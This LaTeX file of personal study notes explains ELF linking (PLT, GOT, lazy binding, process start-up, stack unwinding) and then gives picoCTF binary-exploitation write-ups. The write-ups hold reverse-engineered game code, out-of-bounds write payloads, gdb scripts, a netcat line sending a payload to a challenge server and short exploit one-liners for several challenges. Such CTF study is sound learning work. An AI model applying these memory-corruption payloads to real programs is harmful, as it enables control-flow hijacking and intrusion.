\documentclass[main.tex]{subfiles}

\begin{document}

% 20 - 20 - 24 - 27 - 30 - 33
\begin{tikzpicture}
	\createpin{plt0}{142.5,0}
	\begin{absnode}[-1]{plt0}{115}{Procedure Linkage Table (small \& medium models) [System V ABI]}
		\begin{nasm}
			.PLT0:  push   QWORD PTR [rip+GOT+8]  ; GOT[1] - identifying information
			        jmp    QWORD PTR [rip+GOT+16] ; GOT[2] - dynamic linker's resolver
			        nop    DWORD PTR [rax]
			.PLT1:  jmp    QWORD PTR [rip+name1@GOTPCREL] ; <.PLT0+16>
			        push   index1
			        jmp    .PLT0
			.PLT2:  ...                                   ; <.PLT1+16>
		\end{nasm}
	\end{absnode}
	
	\createpin{gdb}{250,0}
	\begin{absnode}[-1]{gdb}{70}{Bash commands}
		\begin{bash}
			readelf -x .rel.plt ?
			g++ -fno-plt ?
			g++ -Wl,-z,relro -Wl,-z,now ? # full RELRO
		\end{bash}
	\end{absnode}
	
	\createpin{got}{220,-99.5}
	\begin{absnode}[-1]{got}{130}{Global Offset Table (.got) [System V ABI]}
		\begin{enumerate}[leftmargin=*,label=(\arabic*)]
			\item Redirect position-independent address calculations to absolute locations
			\item A symbol is required direct access to absolute address of will have a GOT entry
			\item Since executable or shared object has its own GOT, a shared symbol may have entries in multiple tables. Dynamic linker populates these GOT relocations before process execution
			\item \texttt{GOT[0]} is reserved for \texttt{\_DYNAMIC} structure address, allowing dynamic linker to locate its own metadata and self-initialize (without relying on other programs to relocate its memory image) before relocations run. \texttt{GOT[1]}, \texttt{GOT[2]} are also reserved on AMD64
			\item \texttt{\_GLOBAL\_OFFSET\_TABLE\_} may reside in middle of \texttt{.got}, allowing (non) negative offsets
		\end{enumerate} 
	\end{absnode}
	
	\createpin{plt}{220,-46.5}
	\begin{absnode}[-1]{plt}{130}{Procedure Linkage Table (.plt) [System V ABI]}
		\begin{enumerate}[leftmargin=*,label=(\arabic*)]
			\item \texttt{[Cross-Boundary Resolution]} Link editor can't resolve execution transfers between executables and shared objects, so it redirects those \texttt{position-independent} calls to absolute locations through each file's \texttt{separate} PLT and transfers to PLT only \texttt{from within} the same object
			\item On AMD64, PLTs reside in read-only shared text and fetch absolute addresses from a private, writable GOT updated by dynamic linker
			\item \texttt{[Function Pointer Resolution]} An executable's reference to a function (\texttt{\&func}) defined in a shared object may resolve to the executable's PLT entry, while a reference from within the shared object may resolve to the function's actual address\\[0.1em]
			$\hookrightarrow$  To ensure a \texttt{canonical} function address, link editor tags the executable's PLT address in the symbol table (\texttt{SHN\_UNDEF}, \texttt{STT\_FUNC}, \texttt{st\_value} $\ne$ 0), allowing dynamic linker to redirect function-address references lookup to the main executable's symbol table entry
		\end{enumerate} 
	\end{absnode}
	
	\createpin{noplt}{220,-145.5}
	\begin{absnode}[-1]{noplt}{131.5}{Code Sequences w/o PLT [System V ABI]}
		Resolving all symbols at startup allows GOT to be made read-only, eliminating the security vulnerabilities of a writable GOT while bypassing PLT entirely through indirect GOT calls\\\\
		While this approach disables lazy symbol resolution and limits function interposition strictly to startup, it removes extra PLT branch overhead -- despite code-size tradeoff -- and permits custom, non-System V ABI calling conventions since dynamic linker is no longer invoked at runtime
	\end{absnode}
	
	\createpin{cpp}{21,-132.3}
	\begin{absnode}[-1]{cpp}{42}{GOT-PLT And GOT Slots Example}
		\begin{cpp}	
			extern int foo(void);
			
			void bar(void) 
			{
			    // PLT reference
			    int _ = foo();
			    
			    // GOT reference   
			    int (*p)(void) = foo;  
			}
		\end{cpp}
	\end{absnode}
	
	\createpin{opgot}{90,-132.3}
	\begin{absnode}[-1]{opgot}{94}{Linker Optimization [System V ABI]}
		Referencing a function symbol by both the PLT and GOT causes separate \texttt{JUMP\_SLOT} and \texttt{GLOB\_DAT} run-time relocations that apply the same virtual address to the \texttt{GOT-PLT} and GOT slots, respectively\\\\
		\texttt{[GOT-PLT, GOT combining]} replaces standard PLT entry (\texttt{JUMP\_SLOT}) with \texttt{GOT-PLT} entry that executes indirect jump via unified GOT slot\\\\
		\texttt{[Not applicable for]} pointer equality and \texttt{STT\_GNU\_IFUNC} symbols since \texttt{GOT-PLT} slots must resolve to the selected implementation, whereas GOT slots resolve to the PLT entries
		\vspace{0.4mm}
	\end{absnode}
	
	\createpin{plt1}{35,0}
	\createpin{plt1L1}[1]{35,0}
	\begin{absnode}{plt1}{70}{0x08049050 <printf@plt>}
		\begin{nasm}
			          ; ff 25 10 c0 04 08
			<+0>:     jmp    DWORD PTR ds:0x804c010
			<+6>:     push   0x8      ; relocation index
			<+11>:    jmp    0x8049030
		\end{nasm}
	\end{absnode}

	\createpin{got0}{35,-27}
	\begin{absnode}{got0}{70}{0x804c010 <printf@got.plt>}
		\begin{nasm}
			0x08049056
		\end{nasm}
	\end{absnode}

	\createpin{plt2}{35, -94}
	\begin{absnode}{plt2}{70}{.section\_headers}
		\centering
		\begin{tabular}{ccccc}
			\texttt{[Nr]} & Name & Type & ES & Flg\\
			\texttt{[10]} & \texttt{.rel.plt} & \texttt{REL} & 08 & \texttt{AI}\\[1mm]
			\hline
		\end{tabular}
		\begin{tabular}{cccccc}
			\rule{0pt}{3.5mm} Addr & Off & Size & Lk & Inf & Al\\
			08048424 & 000424 & 000060 & 5 & 22 & 4
		\end{tabular}
		\vspace{0.3mm}
	\end{absnode} 
	
	\createpin{plt3}{35, -46.5}
	\begin{absnode}{plt3}{70}{.rel.plt}
		\centering
		\begin{tabular}{ccc}
			Offset & Info & Sym.Value \\
			0804c010 & 00000207 & 00000000\\[1mm]
			\hline
		\end{tabular}
		\begin{tabular}{cc}
			\rule{0pt}{3.5mm}Sym. Name & Type\\
			\texttt{printf@GLIBC\_2.0} & \texttt{R\_386\_JUMP\_SLOT}
		\end{tabular}
	\end{absnode}
	
	\createpin{plt4}{35, -70.5}
	\begin{absnode}{plt4}{70}{.rel.plt (hex dump)}
		\begin{nasm}
			0x08048424
			<+0>:     0cc00408 07010000                
			<+8>:     10c00408 07020000
		\end{nasm}
	\end{absnode}
	
	\createpin{plt5}{106,-66.5}
	\begin{absnode}{plt5}{62}{.dynamic}
		\centering
		\begin{tabular}{clr}
			Tag & \multicolumn{1}{c}{Type} & Name\texttt{/}Val\\
			0x00000017 & \texttt{JMPREL} & 0x8048424
		\end{tabular}
	\end{absnode}
	
	\createpin{got1}[1]{106,-46.5}
	\begin{absnode}{got1L1}{62}{0x804c010 <printf@got.plt>}
		\begin{nasm}
			0xf7db95c0
		\end{nasm}
	\end{absnode}
	
	\createpin{got2}[1]{106, -86.5}
	\begin{absnode}[-1]{got2L1}{62}{Lazy Symbol Resolution -- Something Magical Happens :)}
		When dynamic linker receives control, after \texttt{jmp GOT[2]}, it unwinds the stack, looks at designated relocation entry, finds symbol's value, stores \texttt{name1} actual address in GOT 
	\end{absnode}
	
    \drawcatenary{plt1}{got0}{0}
    \drawcatenary{plt5}{got0}{0}
    \drawcatenary{plt5}{plt3}{0}
    \drawcatenary{plt5}{plt2}{0}
    \drawcatenary{plt2}{plt3}{0}
    \drawcatenary{plt5}{got2}{0}
    \drawcatenary{plt1L1}{got2}{1.48}
    \drawcatenary{plt1L1}{got1}{0}
    \drawcatenary{got2}{got1}{0}
    \drawcatenary{plt}{plt0}{0}
	\drawcatenary{got2}{got}{0}
	\drawcatenary{opgot}{got}{0}
	\drawcatenary{cpp}{opgot}{0.01}
	
\end{tikzpicture}

\newpage 
\begin{tikzpicture}
	\createpin{exec0}{250,0}
	\begin{absnode}[-1]{exec0}{70}{Process Initializing -- Executing [System V ABI]}
		\texttt{exec(BA\_OS)} creates machine state \texttt{S} for new process
	\end{absnode}
	
	\createpin{exec1}[1]{250,-20}
	\begin{absnode}[-1]{exec1L1}{70}{Process Initializing -- Executing [System V ABI]}
		Language-specific startup code transforms \texttt{S} into state required by language, i.e. \texttt{\_start} prepares \texttt{argc}, \texttt{argv}, \texttt{envp}, then calls \texttt{main()} in C++
		\vspace{1.25mm}
	\end{absnode}
	
	\createpin{exec2}[1]{250,-44}
	\begin{absnode}[-1]{exec2L1}{70}{Process Initializing -- Executing [System V ABI]}
		System finds path to program interpreter (usually dynamic linker); then loads, runs linker before passing control to main application!
	\end{absnode}
	
	\createpin{exec3}[1]{250,-67}
	\begin{absnode}[-1]{exec3L1}{70}{Process Initializing -- Executing [System V ABI]}
		System may create the memory image of the application program before passing control to the interpreter program
	\end{absnode}
	
	\createpin{exec4}[1]{250,-90}
	\begin{absnode}[-1]{exec4L1}{70}{Process Initializing -- Executing [System V ABI]}
		Interpreter program performs several tasks, i.e. symbolic reference resolving and initialization routines processing\\\\
		Initialization functions are specified by \texttt{DT\_INIT}, \texttt{DT\_INIT\_ARAY} and \texttt{DT\_PREINIT\_ARRAY}
	\end{absnode}

	\createpin{exec5}[1]{250,-122}
	\begin{absnode}[-1]{exec5L1}{70}{Process Initializing -- Executing [System V ABI]}
		Interpreter program eventually transfer control to entry point specified in \texttt{AT\_ENTRY} entry (\texttt{\_start} by default)
	\end{absnode}
	
	\createpin{exec6}{250,-145}
	\begin{absnode}[-1]{exec6}{70}{Process Terminating -- Executing [System V ABI]}
		When \texttt{main()} returns, its value is passed to \texttt{exit()}; if \texttt{exit()} is overridden and returns, \texttt{\_exit()}, which must be immune to user interposition, terminates the process
	\end{absnode}
	
	\createpin{exec7}[1]{250,-171}
	\begin{absnode}[-1]{exec7L1}{70}{Process Terminating -- Executing [System V ABI]}
		When \texttt{exit()} is called, registered \texttt{atexit()} handlers are executed, followed by the runtime's termination processing, which invokes \texttt{DT\_FINI\_ARRAY} and \texttt{DT\_FINI}
	\end{absnode}
	
	\createpin{ld}{172,-20}
	\begin{absnode}[-1]{ld}{76}{Program Interpreter [System V ABI]}
		\centering
		\begin{tabular}{|l|r|}
			\hline
			\texttt{Path} & \texttt{Linux Path}\\
			\hline
			\texttt{/lib/ldx32.so.1} & \texttt{/libx32/ld-linux-x32.so.2}\\
			\texttt{/lib/ld64.so.1} & \texttt{/lib64/ld-linux-x86-64.so.2}\\
			\hline
		\end{tabular}
	\end{absnode}
	
	\createpin{aux0}{172,-44}
	\begin{absnode}[-1]{aux0}{76}{Auxiliary Vector [System V ABI]}
		At process creation, the system may transfer control to an interpreter program. In this case, it places either an \texttt{AT\_EXECFD} or an \texttt{AT\_PHDR} entry in the auxiliary vector
	\end{absnode}
	
	\createpin{aux1}{172, -67}
	\begin{absnode}[-1]{aux1}{76}{Auxiliary Vector [Linux Standard Base]}
		\begin{cpp}
			typedef struct
			{
			    long int a_type;        /* Entry type */
			    union
			    {
			        long int a_val;     /* Integer value */
			        void *a_ptr;        /* Pointer value */
			        /* Function pointer value */
			        void (*a_fcn) (void);
			    } a_un;
			} auxv_t;
		\end{cpp}
	\end{absnode}
	
	\createpin{nothing}{169, -114}	
	\begin{absnode}[-1]{nothing}{50}{}
		\includegraphics[width=\linewidth]{image/fault.jpg}
	\end{absnode}
	
	\createpin{exec8}{172, 0}
	\begin{absnode}{exec8}{76}{}
		\begin{cpp}
			execve("./game", ["./game"], 0x7ffe1595e2b8     /* 57 vars */) = 0
		\end{cpp}
	\end{absnode}
	
	\createpin{unwind0}{60,0}
	\begin{absnode}[-1]{unwind0}{120}{Unwinding The Stack [System V ABI]}
		\texttt{[Normal \_Unwind\_RaiseException]} As the stack unwinds while exception propagates, each frame's language or vendor-specific personality routine decides whether to catch or pass the exception (whether ``native'' or ``foreign'')\\\\
		\texttt{[Forced \_Unwind\_ForcedUnwind]} Such as \texttt{longjmp} and thread termination\\[0.5em]
		An external agent determines when to stop (overrides default decisions of calls using \texttt{\_UA\_FORCE\_UNWIND} -- must continue) via a proxy personality routine that intercepts calls\\[0.5em]
		If a catch-all block executes during forced unwinding, unwinding automatically proceeds at the block's end, regardless of an explicit re-throw
	\end{absnode}  	
	
	\createpin{unwind1}{60,-46}
	\begin{absnode}[-1]{unwind1}{120}{2-Phase Exception Handling Process [System V ABI]}
		Unwinding requires \texttt{Call Frame Information (CFI)}, stored in ELF sections (e.g., \texttt{.eh\_frame} of type \texttt{SHT\_X86\_64\_UNWIND}). \texttt{Canonical Frame Address (CFA)} is \texttt{rsp} at the previous frame's call site. \texttt{LSDA} stands for \texttt{Language-Specific Data Area}\\\\
		Both phases of unwinding use the \texttt{unwind library} (to locate and restore previous stack frames) and \texttt{personality routines} (to identify handlers and transfer control)
	\end{absnode}  

	\createpin{unwind2}{60,-73.5}
	\begin{absnode}[-1]{unwind2}{120}{Search Phase w \_UA\_SEARCH\_PHASE flag [System V ABI]}
		Unwinder repeatedly calls personality routine, passing current \texttt{rip} and register state, frame-by-frame, until a handler is found or stack is exhausted (if so, program \texttt{terminate()}\\\\
		No hardware registers are modified, no stack frames popped, and no destructors executed and personality routine must access state strictly via API\\\\
		Because state is intact, exceptions can be dismissed before physical unwinding begins, which allows non-C++ presumptive exception handling (correcting exceptional condition and resuming execution directly at the throw site)
	\end{absnode}  
	
	\createpin{unwind3}{60,-110.9}
	\begin{absnode}[-1]{unwind3}{120}{Cleanup Phase w \_UA\_CLEANUP\_PHASE flag [System V ABI]}
		Unwinder repeatedly calls personality routine with \texttt{rip} and register state, physically unwinding frames until reaching the identified handler's frame\\\\
		Personality routine prepares landing pad parameters in four specific registers (\texttt{rdi}, \texttt{rsi}, \texttt{rdx}, \texttt{rcx}) and returns \texttt{\_URC\_INSTALL\_CONTEXT}, unwind library then restores the callee-saved registers, plus these four, to their state in the frame prior to the throwing call\\\\
		Execution jumps to the user landing pad code, which resolves in one of two ways: \texttt{(i) Normal Resume} -- execution continues normally (e.g., at the end of a C++ catch) or \texttt{(ii) \_Unwind\_Resume} -- called if personality routine did not return \texttt{\_Unwind\_HANDLER\_FOUND} during Search Phase -- which never returns and passes \texttt{exceptionObject} argument\\\\
		\texttt{[Resource Tracking]} \texttt{exceptionObject} tracks allocated resources that are freed before entering a standard handler landing pad, but not before non-handler pads (cleanup is deferred since \texttt{\_Unwind\_Resume} will eventually handle it)
	\end{absnode}
	
	\createpin{unwind4}{50,-170.5}
	\begin{absnode}[-1]{unwind4}{100}{Unwind Through Assembler Code [System V ABI]}
		\begin{nasm}
			.cfi_def_cfa REG, OFF       CFA = REG's addr + OFF
			.cfi_def_cfa_register REG   CFA = REG's addr + old OFF
			.cfi_def_cfa_offset OFF     CFA = old REG's addr + OFF
			.cfi_adjust_cfa_offset OFF  CFA = old REG's addr + (old += OFF)
		\end{nasm}
	\end{absnode}

	\createpin{unwind5}{155.5,-170.5}
	\begin{absnode}[-1]{unwind5}{109}{Unwind Through Assembler Code [System V ABI]}
		\begin{nasm}
			.cfi_startproc.cfi_endproc   used for functions needing .eh_frame
			.cfi_offset REG, OFF         saves prev REG value at OFF(CFA)
			.cfi_rel_offset REG, OFF     saves prev REG value at OFF(curr CFA reg)
			.cfi_escape EXPRESSION[,...] add arbitrary bytes to the unwind info 
		\end{nasm}
	\end{absnode}
	
	\drawcatenary{exec2}{ld}{0}
	\drawcatenary{exec2}{aux0}{0.01}
	\drawcatenary{aux1}{aux0}{0}
	\drawcatenary{exec8}{exec0}{0.01}
	
\end{tikzpicture}

\newpage 

\begin{tikzpicture}
	\createpin{main0}{35,0}
	\begin{absnode}{main0}{70}{<main>}
		\begin{cpp}
			// int main()
			init_player(&a);
			b = 1, c = 0;
			init_map(&d, &a, &b);
			print_map(&d, &a, &b);
			
			signal(2, ebx - 0x2dea);
			while (true) {
			    g = getchar();
			    move_player(&a, &g, &d, &b);
			    print_map(&d, &a, &b);
			    
			    if (a == 29 && e == 89 && b != 4) {
			        puts(ebx - 0x1f18);
			        
			        ++c; ++b;
			        init_player(&a);
			        init_map(&d, &a, &b);
			    }
	
			    if (a == 29 && e == 89 && b == 5 
			                           && c == 4) 
			    { win(&b); return 0; }
			}
		\end{cpp}
	\end{absnode}
		
	\createpin{main1}{106,0}
	\begin{absnode}{main1}{62}{<main>}
		\begin{cpp}	
			int* ebp = nullptr;
			int* ebx = nullptr;
			c = *(ebp - 0xc);
			g = *(ebp - 0xd);
			d = *(ebp - 0xa99);
			f = *(ebp - 0xaa0);
			e = *(ebp - 0xaa4);
			a = *(ebp - 0xaa8);
			b = *(ebp - 0xaac);
		\end{cpp}
	\end{absnode}	
	
	\createpin{init}{106,-42}
	\begin{absnode}{init}{62}{<init\_player>}
		\begin{cpp}
			// void init_player(int* x)
			*x = 4;         // a
			*(x + 1) = 4;   // e
			*(x + 2) = 50;  // f
		\end{cpp}
	\end{absnode}
	
	\createpin{mainv20}{176,0}
	\begin{absnode}{mainv20}{68}{<mainV2>}
		\begin{cpp}
			struct player {
			    int height, width, lives;
			    void init() {
			        height = 4;
			        width = 4;
			        lives = 50;
			    }
			};
			
			int c = 0;         // -0xc
			char input;        // -0xd
			char map[30][90];  // -0xa99
			player p;          // -0xaa8
			int level = 1;     // -0xaac
		\end{cpp}
	\end{absnode}
	
	\createpin{mainv21}{250,0}
	\begin{absnode}{mainv21}{70}{<mainV2>}
		\begin{cpp}
			// int main()
			player.init();
			init_map ((char*)map, &p, &level);
			print_map((char*)map, &p, &level);
			
			std::signal(2, ebx - 0x2dea);
			while (true) {
			    input = std::getchar();
			    move_player(&p, &input, map, &level);
			    print_map(...);
			    
			    if (p.height == 29 && p.width == 89 
			     && level != 4) {
			        puts("some string");
			        
			        ++c, ++level;
			        player.init();
			        init_map(...);
			    }
			    
			    if (p.height == 29 && p.width == 89 
			     && level == 5 && c == 4) {
			        win(&level);
			        return 0;
			    }
			}
		\end{cpp}
	\end{absnode}
	
	\createpin{move}{35,-90}
	\begin{absnode}{move}{70}{<move\_player>}
		\begin{cpp}
			char player_tile; // global varible
			
			// void move_player(int* p, char* input
			//                , char* map, int* level) 
			if (*(p+2) <= 0) exit(0);
			if (*input=='l') player_tile = getchar();
			if (*input=='p') solve_round(map, p, level);
			
			map[*(p) * 90 + *(p+1)] = '.';
			if (*input == 'w' || *input == 's' 
			 || *input == 'a' || *input == 'd') 
			    normal_move();
			
			if (map[*(p) * 90 + *(p+1)] == '#') exit(0);
			map[*(p) * 90 + *(p+1)] = '@';
			--*(p+2);
		\end{cpp}
	\end{absnode}
	
	\createpin{solve}{35,-155}
	\begin{absnode}{solve}{70}{<solve\_round>}
		\begin{cpp}
			// void solve_round(char* m, int* p, int* l) 
			char _;
			while (*(p+1) != 89) 
			    *(p+1)>88? move_player(p,(_='a',&_),..);
			             : move_player(p,(_='d',&_),..);
			while (*p != 29) 
			    *p > 28  ? move_player(p,(_='s',&_),..);
			             : move_player(p,(_='w',&_),..);
			sleep(0);
			if (*(p) == 29 || *(p+1) == 89) {/* :D? */}
		\end{cpp}
	\end{absnode}
	
	\createpin{mainv22}{250,-96.5}
	\begin{absnode}{mainv22}{70}{<mainV2>}
		\begin{cpp}
			// void move_player(player* p, char* input
			//          , char map[30][90], int* level) 
			if (p->lives<=0) exit(0);
			if (*input=='l') player_tile = getchar();
			if (*input=='p') solve_round(map, p, level);
			
			map[p->height][p->width] = '.';
			std::vector<char> _ = {'w', 's', 'a', 'd'};
			if (std::find(_.begin(), _.end(), *input) 
			    != _.end()) normal_move(...);
			
			if (map[p->height][p->width]=='#') exit(0);
			map[p->height][p->width] = player_tile;
			--p->lives;
		\end{cpp}
	\end{absnode}
	
	\createpin{main2}{106,-68}
	\begin{absnode}{main2}{62}{<main>}
		\begin{nasm}
			0x08049927:  call   ..<move_player>
			0x0804992c:  add    esp,0x10
			...
			0x08049979:  push   eax
			0x0804997a:  call   ..<puts@plt>
			0x0804997f:  add    esp,0x10
			0x08049982:  ;      ++c; ++level;
			...
			0x080499f4:  cmp    ..PTR [ebp-0xc],0x4
			0x080499f8:  jne    ..<main+148>
			0x080499fe:  ;      win(&level);
		\end{nasm}
	\end{absnode}
	
	\createpin{payload0}{176,-58}
	\begin{absnode}{payload0}{68}{<payload>}
		\begin{cpp}
			liveInc = "aaaaaaaawwwws";
			autoSol = liveInc + "p";
			
			// 'y' ← 0x79
			levelUp = liveInc + "aaaaaaaaaaaaaaaaaaaa"
			          "aaaaaaaaaaaaaaaaaaaaaaaaaaalyw";
	
			// '?' ← Unicode F4 8F BF BF
			winJump = liveInc + "aaaaaaaaaaaaaaaaaaaa"
			   "aaaa" "aaaaaaaaaaaaaaaaaaaaaaaaaaal?w";
			
			c = 3; level = 4; // 3 * autoSol
			c = 4; level = 5; //   + levelUp
			if (c == 4) win() //   + winJump
		\end{cpp}
	\end{absnode}
	
	\createpin{gdb}{176,-164.5}
	\begin{absnode}[-1]{gdb}{68}{[-{-} dbg.exp {-}-]}
		\begin{bash}
			#!/usr/bin/expect -f
			spawn gdb -x gdbinit game
			
			send "run\r"
			send "[read [open "payload.txt" r]]"
			
			interact
		\end{bash}
	\end{absnode}
	
	\createpin{gdbinit0}{106,-116}
	\begin{absnode}[-1]{gdbinit0}{62}{[-{-} .gdbinit {-}-]}
		\begin{cpp}
			set disassembly-flavor intel
			set pagination off
			define c
			    tui disable
			    continue
			end
		\end{cpp}
	\end{absnode}
	
	\createpin{gdbinit1}{106,-148.2}
	\begin{absnode}[-1]{gdbinit1}{62}{[-{-} gdbinit {-}-]}
		\begin{cpp}
			break *move_player+361 if $found || *(char*)($ebp+0xc) == '?'
			
			set $found = 0
			commands
			    if $found == 0
			        set $found = 1
			        continue
			    end
			    layout asm
			    focus cmd
			end
		\end{cpp}
	\end{absnode}
	
	\createpin{payload1}{176,-116}
	\begin{absnode}[-1]{payload1}{68}{[-{-} payload.txt {-}-]}
		\begin{bash}
			( 
			  # 0xa99 - (0xaa8 - 0x8 - 0x3) == -4
			  perl -E "print (('a'x4, 'aw'x4, sp)x3)";
			
			  # challenging without dynamic analysis
			  perl -E "print 'a'x4,'aw'x4,'s','a'x47"; 
			  printf  "l\x7fw";
			
			  perl -E "print 'a'x4,'aw'x4,'s','a'x47";
			  printf  "l\xfew";
			) > payload.txt
		\end{bash}
	\end{absnode}
	
	\createpin{bash}{250,-155.3}
	\begin{absnode}[-1]{bash}{70}{Bash commands}
		\begin{bash}
			printf "\xf4"
			# hex representation
			xxd -p ? | sed 's/../\\x&/g'
			
			# standard input (stdin)
			./? < <(cat ? -)     
			# controlling terminal (tty)
			./? < <(cat ?; cat /dev/tty)
			
			cat ? | nc -q ? rhea.picoctf.net ?
		\end{bash}
	\end{absnode}

    \drawcatenary{main1}{mainv20}{0.01}
    \drawcatenary{init}{mainv20}{0}
    \drawcatenary{mainv20}{mainv21}{0.01}
    \drawcatenary{main2}{payload0}{0}
    \drawcatenary{gdb}{gdbinit0}{0}
    \drawcatenary{gdb}{gdbinit1}{0}
    \drawcatenary{payload1}{gdb}{0}
    \drawcatenary{gdbinit1}{payload1}{0}
    \drawcatenary{mainv22}{payload0}{0}
    \drawcatenary{payload0}{mainv20}{0}
    
\end{tikzpicture}
	
\newpage 

\begin{minipage}[t]{0.49\textwidth}
	\setlength{\parskip}{1em}
	\begin{enumerate}
		\item[\texttt{[\_]}] \texttt{[Information]} \texttt{LB\_BIND\_NOW} environment variable can change dynamic linking behavior that evaluates PLT entries before transferring control to program
		\item[\texttt{[\_]}] \texttt{[Have not yet understood]} \texttt{R\_X86\_64\_TLSDESC} relocations support lazy relocation using dedicated PLT, GOT entries given by \texttt{DT\_TLSDESC\_PLT}, \texttt{DT\_TLSDESC\_GOT}
		\item[\texttt{[\_]}] \texttt{[Information]} To support IBT (Intel CET Extension), linker should generate a IBT-enabled PLT together with a second PLT so that the initial value of GOT entry for external function is address of corresponding second PLT entry
		\begin{center}\setlength{\parskip}{0pt}\texttt{call $\rightarrow$ .SPLT $\rightarrow$ .PLT $\rightarrow$ GOT[1,2] $\rightarrow$ Linker Dynamic}\end{center}
	\end{enumerate}
	
	\setlength{\parskip}{0.4em}
	\userline
	
	\setlength{\parskip}{1em}
	\begin{enumerate}
		\item[\texttt{[\_]}] \texttt{[\_\_Comment\_\_]} \texttt{babygame03} analysis deserves a whole new empty page, so some closely related in4 (i.e., unwinding the stack) is provided to make the page feel less empty
		\item[\texttt{[\_]}] \texttt{[Information]} \texttt{.cfi\_startproc}
		initializes some internal data structures and emits architecture dependent initial CFI instructions
		\item[\texttt{[\_]}] \texttt{[Information]} \texttt{.cfi\_escape EXPRESSION[,...]} can be used to add OS-specific CFI opcodes, or generic CFI opcodes that assembler does not support
	\end{enumerate}
	
	\setlength{\parskip}{0.4em}
	\userline
	
	\setlength{\parskip}{1em}
	\begin{enumerate}
		\item[\texttt{[\_]}] \texttt{[\_\_Comment\_\_]} \texttt{babygame03} analysis uses manual reverse engineering, primarily static analysis, while also using dynamic analysis to name vars and identify injection locations
		\item[] \texttt{[\_\_Thought\_\_]}
		\setlength{\parskip}{0.1em}
		\begin{enumerate}[leftmargin=0pt, labelindent=0pt]
			\item[\texttt{[0]}]	\texttt{ebx == .got?}\\
			The fuck is going on? How to approach 5 for legitimate player?
			\item[\texttt{[2]}] \texttt{x $\rightarrow$ eip $\rightarrow$ ebp}\\
			The fuck is going on? Is \texttt{x} an array instead?
			\item[\texttt{[3]}] \texttt{0xa99 = 0xd + 2700}
			\item[\texttt{[5]}] \texttt{level $\rightarrow$ map $\rightarrow$ input $\rightarrow$ p $\rightarrow$ eip $\rightarrow$ [ebp] $\rightarrow$ esi $\rightarrow$ ebx $\rightarrow$ *input} \\
			\texttt{0x804c044 <player\_tile>: 0x00000040 `@'}
			\item[\texttt{[6]}] \texttt{l$_{\texttt{evel}}$ $\rightarrow$ p $\rightarrow$ m$_{\texttt{ap}}$ $\rightarrow$ eip $\rightarrow$ ebp}
		\end{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[5]}] Why is \texttt{lea} used in \texttt{-{-}*(p+2)}?\\
		$\rightarrow$ A fast arithmetic trick without altering \texttt{EFLAGS}
		\item[\texttt{[8]}] What is the highest first byte that a copyable Unicode character can have?\\
		$\rightarrow$ \texttt{F4} (for example, \texttt{F4 8F BF BF})
		\item[\texttt{[9]}] Why does \texttt{winJump} add an extra 4 bytes? \texttt{(cdecl)}\\
		$\rightarrow$ Caller is required to clean up stack, so jumping to \texttt{push} \texttt{eax} adds an extra 4 bytes
		\item[\texttt{[\_]}] \texttt{[\_\_Comment\_\_]} My work is too complicated due to: (i) being foolishly restricted to printable characters only, (ii) some repetitive tasks being handled manually, (iii) being too lazy to do some math, so I mostly rely on GDB to correct injection points visually
	\end{enumerate}
\end{minipage}
\hfill
\begin{minipage}[t]{0.49\textwidth}
	\begin{enumerate}
		\setlength{\parskip}{1em}
		\item[\texttt{[\_]}] \texttt{[\_\_Comment\_\_]} \texttt{So} I decided to optimize and formalize the process with some help from another online write-up \href{https://github.com/snwau/picoCTF-2024-Writeup/blob/main/Binary%20Exploitation/babygame03/babygame03.md}{\texttt{(snwau)}}
		\item[\texttt{[\_]}] \texttt{[\_\_Bewilder\_\_]} Using \texttt{``run < <(cat payload.txt; cat /dev/tty)''} in \texttt{gdbinit} can lead to confusing behavior, i.e. \texttt{ctrl+c} $\rightarrow$ \texttt{continue} then:\\[0.3em]
		\makebox[\linewidth][c]{``Program received signal \texttt{SIGTTIN}, Stopped (\texttt{tty} input).''}\\\\
		\makebox[\linewidth][c]{\texttt{[}Admittedly, I only glanced at the issue and made a quick guess\texttt{]}}\\\\
		The program runs normally if nothing has been interrupted in GDB yet.\\[0.3em]
		However, when a \texttt{SIGINT} signal (such as \texttt{ctrl+c} or \texttt{break}) is raised, GDB will catch it and send all other processes to the background except itself.\\[0.3em]
		When you resume execution (using \texttt{continue}), only the main program is brought to the foreground, not the subprocess \texttt{cat /dev/tty}.\\[0.3em]
		As a result, the program receives a \texttt{SIGTTIN} signal.
		\item[\texttt{[\_]}] \texttt{[\_\_Epilogue\_\_]} Well, I mean, it takes sooooo longgggggggggg to do manual reverse engineering. I still don’t know how to organize or take notes for efficient evidence saving. I expected that there would be insights or something that would help me focus more, but well, nothing. Binary exploitation is a good part, not a hard one; but when it comes to practice, I did not follow the exploit process that requires gathering (such as how far the location that \texttt{eip} can point to) as much as possible at the beginning, before doing any fucking thing.
	\end{enumerate}
	
	\setlength{\parskip}{0.4em}
	\userline
	
	\setlength{\parskip}{1em}
	\begin{enumerate}
		\item[\texttt{[\_]}] \texttt{[babygame02]} Just a simpler version of \texttt{babygame03} where the \texttt{level} and \texttt{lives} mechanism does not exist, so only the third step is taken:\\[0.3em]
		\makebox[\linewidth][c]{\texttt{perl -E "print `a'x40, `aw'x3, lpw"}}
		\item[\texttt{[\_]}] \texttt{[babygame01]} Just a simpler version of \texttt{babygame03} where there is a \texttt{lives}-like mechanism, i.e. ``\texttt{player has flag}'' should be non-zero:\\[0.3em]
		\makebox[\linewidth][c]{\texttt{perl -E "print `a'x4, `aw'x4, sp"}}
		\item[\texttt{[\_]}] \texttt{[Heap Havoc]} Another perspective on memory layout -- heap grows upward. A slightly challenging aspect is determining which addr is writable and formatting LE$_{\text{ndian}}$ output: \\[0.3em]
		\makebox[\linewidth][c]{\texttt{perl -E "print `a'x16, `b'x4"; printf "{\textbackslash}x38{\textbackslash}xc0{\textbackslash}x04{\textbackslash}x08{\textbackslash}xb6{\textbackslash}x92{\textbackslash}x04{\textbackslash}x08"}}
		\item[\texttt{[\_]}] \texttt{[function overwrite]} Two remarks are that \texttt{void (*check)(char*, size\_t) = hard\_checker;} -- \texttt{.data} is located at a lower memory address than \texttt{.bss} -- \texttt{int fun[10] = \{0\};}, and that maximum value of \texttt{signed char} is \texttt{0x7f} rather than \texttt{0xff}: \\[0.3em]
		\makebox[\linewidth][c]{\texttt{perl -E `print "{\textbackslash}x7f"x10, "{\textbackslash}x43"'; echo " -16 -314"}}
		\item[\texttt{[\_]}] \texttt{[wine]} This problem should not be considered difficult! My error was in assuming that \texttt{gets} would terminate when it encountered a \texttt{{\textbackslash}x00} character: \\[0.3em]
